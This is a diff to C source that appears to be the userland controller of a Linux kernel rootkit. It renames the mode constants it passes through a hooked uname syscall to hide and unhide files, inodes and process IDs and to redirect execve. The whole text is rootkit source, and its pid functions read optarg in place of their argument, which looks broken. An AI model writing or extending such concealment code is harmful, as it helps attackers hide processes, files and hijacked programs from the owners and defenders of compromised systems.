@@ -83,7 +83,7 @@ void hide_file(const char *path)
 	}
 
 	set_magics(&args);
-	args.mode = HIDE_INODE;
+	args.mode = SYSCALL_HIDE_INODE;
 	args.param1 = ino;
 	syscall(SYS_uname, &args);
 }
@@ -100,7 +100,7 @@ void unhide_file(const char *path)
 	}
 
 	set_magics(&args);
-	args.mode = UNHIDE_INODE;
+	args.mode = SYSCALL_UNHIDE_INODE;
 	args.param1 = ino;
 	syscall(SYS_uname, &args);
 }
@@ -111,7 +111,7 @@ void hide_pid(pid_t pid)
 	char proc_path[64];
 
 	set_magics(&args);
-	args.mode = HIDE_PID;
+	args.mode = SYSCALL_HIDE_PID;
 	args.param1 = atoi(optarg);
 	syscall(SYS_uname, &args);
 
@@ -128,7 +128,7 @@ void unhide_pid(pid_t pid)
 	char proc_path[64];
 
 	set_magics(&args);
-	args.mode = UNHIDE_PID;
+	args.mode = SYSCALL_UNHIDE_PID;
 	args.param1 = atoi(optarg);
 	syscall(SYS_uname, &args);
 
@@ -143,7 +143,7 @@ void hide_filename(const char *name)
 	struct rk_args args;
 
 	set_magics(&args);
-	args.mode = HIDE_FILE;
+	args.mode = VFS_HIDE_FILE;
 	args.p_param1 = (void *)name;
 	args.param2 = strlen(name);
 	syscall(SYS_uname, &args);
@@ -154,7 +154,7 @@ void unhide_filename(const char *name)
 	struct rk_args args;
 
 	set_magics(&args);
-	args.mode = UNHIDE_FILE;
+	args.mode = VFS_UNHIDE_FILE;
 	args.p_param1 = (void *)name;
 	args.param2 = strlen(name);
 	syscall(SYS_uname, &args);
@@ -173,7 +173,7 @@ void redirect_execve(char *path)
 	new_path++;
 
 	set_magics(&args);
-	args.mode = REDIRECT_EXECVE;
+	args.mode = SYSCALL_REDIRECT_EXECVE;
 	args.p_param1 = old_path;
 	args.param2 = strlen(old_path);
 	args.p_param3 = new_path;
@@ -186,7 +186,7 @@ void unredirect_execve(char *path)
 	struct rk_args args;
 
 	set_magics(&args);
-	args.mode = UNREDIRECT_EXECVE;
+	args.mode = SYSCALL_UNREDIRECT_EXECVE;
 	args.p_param1 = path;
 	args.param2 = strlen(path);
 	syscall(SYS_uname, &args);
@@ -209,12 +209,12 @@ int main(int argc, char **argv)
 			usage(argv[0]);
 			return 0;
 		case 0:
-			args.mode = HIDE_INODE;
+			args.mode = SYSCALL_HIDE_INODE;
 			args.param1 = atoi(optarg);
 			syscall(SYS_uname, &args);
 			break;
 		case 1:
-			args.mode = UNHIDE_INODE;
+			args.mode = SYSCALL_UNHIDE_INODE;
 			args.param1 = atoi(optarg);
 			syscall(SYS_uname, &args);
 			break;
